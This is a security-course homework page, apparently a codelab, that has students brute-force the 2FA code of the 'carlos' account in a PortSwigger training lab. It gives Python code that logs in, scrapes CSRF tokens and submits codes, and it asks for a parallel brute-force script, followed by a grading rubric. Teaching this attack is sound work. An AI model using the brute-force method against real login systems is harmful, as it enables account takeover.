@@ -1,0 +1,141 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>1.4: HW1 (2fa-bypass-using-a-brute-force-attack)</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W1.4_hw1" title="1.4: HW1 (2fa-bypass-using-a-brute-force-attack)" environment="web" feedback-link="https://docs.google.com/document/d/17FL7FOT6naN1I-u4Cvo6A88sZSpsZ9P2gqS0OxojSR0">
+<google-codelab-step label="authentication/multi-factor" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack" target="_blank">2fa-bypass-using-a-brute-force-attack</a></h2>
+<p>In this level, the login process is protected by a 2-factor authentication flow. Once a user submits a correct set of credentials to the <code>/login</code> path, they are redirected to the <code>/login2</code> path that handles the second factor. Upon visiting the <code>/login2</code> path, a 2FA code to be emailed to the user. The <code>/login2</code> page implements a form that the user then fills with the 2FA code. The main flaw is that the handler for the 2FA form is not rate-limited to prevent brute-force attacks.</p>
+<p>You are initially given credentials to the victim&#39;s account (<code>carlos:montoya</code>), however, you do not have access to the email address of the victim and can not determine the 2FA code that is sent upon logging in as the victim. To attack the level, you will need to perform a brute-force attack on <code>carlos</code>&#39;s 2FA code. In order for the attack to be efficient, you will need to use <code>multiprocessing</code> or <code>asyncio</code> to perform the brute-force attack. </p>
+</google-codelab-step>
+<google-codelab-step label="Python environment" duration="2">
+<p>You will be writing your attack in Python using the <code>requests</code> and <code>BeautifulSoup</code> packages.</p>
+<ul>
+<li>In your course repository, create the directory below and <code>cd</code> into it.</li>
+</ul>
+<pre><code>cd &lt;path_to_your_git_repository&gt;
+mkdir hw1
+cd hw1</code></pre>
+<ul>
+<li>Create a file called <code>requirements.txt</code> with the following inside. The file contains the Python packages we want to install.</li>
+</ul>
+<pre><code>requests
+bs4</code></pre>
+<ul>
+<li>Set up your environment in the directory</li>
+</ul>
+<pre><code>virtualenv -p python3 env
+source env/bin/activate
+pip install -r requirements.txt</code></pre>
+</google-codelab-step>
+<google-codelab-step label="Initial program" duration="5">
+<p>Create an initial Python script using the code below called <code>hw1.py</code> that programmatically logs in as <code>carlos:montoya</code>, requests a 2FA code, and then submits the code &#39;<code>0000</code>&#39; in an attempt to successfully log-in. </p>
+<p>The program begins by visiting the login page and obtaining the <code>csrf</code> token of the login form.</p>
+<h2 is-upgraded>hw1.py</h2>
+<p>We begin by taking a single argument from the command line that contains the URL of our Portswigger level. To do so, we import Python&#39;s sys package and read in the first command-line argument with it (<code>sys.argv[1]</code>). If the full URL is given, we strip off the outer parts of it so that we get just the <code>site</code>&#39;s hostname.</p>
+<pre><code>import sys
+site = sys.argv[1]
+if &#39;https://&#39; in site:
+    site = site.rstrip(&#39;/&#39;).lstrip(&#39;https://&#39;)</code></pre>
+<p>Next, we instantiate a session and get the login page for the level. Note that this level is protected with a csrf token hidden in the form field. The program uses BeautifulSoup to parse this out.</p>
+<pre><code>s = requests.Session()
+login_url = f&#39;https://{site}/login&#39;
+resp = s.get(login_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)</code></pre>
+<p>Then, the program creates a dictionary containing the user credentials we&#39;re given and submits it to the login form along with the <code>csrf</code> token. </p>
+<pre><code>logindata = {
+    &#39;csrf&#39; : csrf,
+    &#39;username&#39; : &#39;carlos&#39;,
+    &#39;password&#39; : &#39;montoya&#39;
+}
+print(f&#39;Logging in as carlos:montoya&#39;)
+resp = s.post(login_url, data=logindata)
+print(f&#39;Login response: {resp.text}&#39;)</code></pre>
+<p>Upon successful login, an HTTP redirect is given that automatically sends us to the <code>/login2</code> page that implements the 2FA process. As part of this process, a 2FA code is automatically sent to the email address of the account which is not accessible. The <code>/login2</code> form also has a <code>csrf</code> token we&#39;ll need to include for when we submit the code. </p>
+<pre><code>soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)</code></pre>
+<p>Finally, we attempt to submit &#39;0000&#39; as the 2FA code and view the response. The code for doing so is shown below. As the code shows, we must zero-pad the number to 4 digits via <code>zfill</code>. We then POST the code to the <code>/login2</code> path, but we specify that the keyword argument <code>allow_redirects</code> is false. This prevents Python requests from automatically following an HTTP redirect. For this authentication workflow, a redirect to the landing page indicates a successful login. We can check for this via the response&#39;s <code>status_code</code>.</p>
+<pre><code>login2_url = f&#39;https://{site}/login2&#39;
+login2data = {
+    &#39;csrf&#39; : csrf,
+    &#39;mfa-code&#39; : str(0).zfill(4)
+}
+resp = s.post(login2_url, data=login2data, allow_redirects=False)
+if resp.status_code == 302:
+    print(f&#39;2fa valid with response code {resp.status_code}&#39;)
+    # Visit account profile page to complete level
+else:
+    print(f&#39;2fa invalid with response code: {resp.status_code}&#39;)</code></pre>
+<p>After finding the correct code, we can then visit <code>carlos</code>&#39;s account profile page (<code>/my-account?id=carlos</code>) to solve the level.</p>
+<p>Note that the web application only allows 2 incorrect guesses of the code before requiring the user to login again. As a result, you will need to login again to attempt subsequent codes in your program.</p>
+</google-codelab-step>
+<google-codelab-step label="Run the program" duration="5">
+<p>Run the program on your site to show that you can login with the given account credentials to get to the 2FA page, but that the 2FA submission fails.</p>
+<pre>python hw1.py &lt;Level_URL&gt;
+...
+&lt;form class=login-form method=POST&gt;
+    &lt;input required type=&#34;hidden&#34; name=&#34;csrf&#34; value=&#34;53...K&#34;&gt;
+    &lt;label&gt;Please enter your 4-digit security code&lt;/label&gt;
+    &lt;input required type=text name=mfa-code&gt;
+    &lt;button class=button type=submit&gt; Login &lt;/button&gt;
+&lt;/form&gt;
+...
+2fa invalid with response code: 200</pre>
+<p>Then, add, commit and push this initial script and its <code>requirements.txt</code> into your repository</p>
+<pre><code>git add .
+git commit -m &#34;Initial script&#34;
+git push</code></pre>
+<p>Ensure that your local Python environment in <code>env</code> has not been added to the repository. It will be ignored as long as you&#39;ve properly included it in the <code>.gitignore</code> file as instructed when you set up your course <code>git</code> repository.</p>
+</google-codelab-step>
+<google-codelab-step label="Python program" duration="120">
+<p>Modify <code>hw1.py</code> to implement a program that performs a brute-force attack on the 2FA code for the account <code>carlos</code> in order to successfully authenticate as the account. While for testing purposes, you can visit the account&#39;s profile page in order to solve the level, please remove this request when submitting your final program. For grading purposes, we need the level to remain unsolved to grade subsequent programs. Instead, modify your program to simply output the 2fa code instead. </p>
+<h2 is-upgraded>Requirements</h2>
+<ul>
+<li>Commit frequently to your repository in order to record your progress.</li>
+<li>Make your program concise and modular by defining at least one function that encapsulates a key part of your program. If you find you have deep levels of indentation, consider the use of a function call.</li>
+<li>Throughout the program and especially in function declarations use Python <a href="https://github.com/google/styleguide/blob/gh-pages/pyguide.md" target="_blank">docstrings</a> to specify parameter names and their types as well as provide code documentation for the functionality implemented. An example of a well-documented Python function is shown below </li>
+</ul>
+<pre><code>def run_test(login, password, url, num_tests):                                  
+    &#34;&#34;&#34;Records timing data for an individual attack
+    Args:
+        login (str): login to test
+        password (str): password to test
+        url (str): URL to test
+        num_tests (int): number of tests to run
+    Returns:
+        float: Average time taken across tests                 
+    &#34;&#34;&#34;                                                                         </code></pre>
+<h2 is-upgraded>Rubric</h2>
+<ul>
+<li>Program correctness</li>
+<li>Follows the guidelines described above including use of the initial program to derive your solution from. Your program must take the level&#39;s URL as a command-line parameter.</li>
+<li>Reliably and quickly performs the attack using <code>multiprocessing</code> or <code>asyncio</code>.</li>
+<li>Checks for errors as part of its operation</li>
+<li>Finds the correct 2fa code and outputs it, but does not solve the level.</li>
+<li>Program is concise and modular</li>
+<li>Code is documented clearly</li>
+<li>Multiple incremental commits have been made to the git repository as the program has been developed</li>
+<li><code>git</code> repository contains Python program and its <code>requirements.txt</code> file and does not include a full Python environment</li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
